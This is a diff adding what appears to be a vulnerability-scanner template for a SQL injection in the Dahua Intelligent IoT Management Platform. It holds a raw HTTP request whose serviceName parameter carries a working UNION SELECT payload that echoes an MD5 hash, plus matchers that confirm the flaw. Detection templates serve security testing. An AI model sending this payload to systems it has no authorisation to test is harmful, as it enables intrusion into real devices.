@@ -1,0 +1,28 @@
+id: dahua-icc-sql-injection
+
+info:
+  name: Dahua Intelligent IoT Management Platform SQL Injection
+  author: k5rC85Lma
+  severity: high
+  description: |
+    A SQL injection vulnerability exists in the Dahua IoT Management Platform at the evo-apigw/evo-arsm/1.0.0/ars/list endpoint.
+  reference:
+    - https://mp.weixin.qq.com/s/GbmIyGNB3Gd16n9RCCyPCg
+  tags: Dahua-ICC
+
+http:
+  - raw:
+      - |
+        GET /evo-apigw/evo-arsm/1.0.0/ars/list?serviceName=%27+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,md5(1),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "~c4ca4238a0b923820dcc509a6f75849b~"
+        part: body
